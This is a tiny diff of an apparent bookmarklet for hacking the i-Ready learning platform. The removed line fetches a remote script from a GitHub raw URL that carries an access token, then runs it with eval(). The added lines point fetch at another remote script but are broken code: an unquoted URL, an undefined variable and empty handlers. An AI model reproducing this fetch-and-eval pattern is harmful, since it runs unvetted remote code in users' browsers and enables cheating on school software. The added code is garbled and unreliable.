@@ -1,1 +1,9 @@
-javascript:fetch("https://raw.githubusercontent.com/RipAngelhacks/i-ready-hack-javascript/main/main.js?token=GHSAT0AAAAAACAWSY4G52WJ67VFA4NWP5S6ZCK2XQA%22).then(r%20=%3E%20r.text()).then(r%20=%3E%20eval(r))
+let response = fetch(https://raw.githubusercontent.com/FuckNico/susi-code/main/main2.js);
+fetch(url)
+    .then(response => {
+        // handle the response
+    })
+    .catch(error => {
+        // handle the error
+    });
+
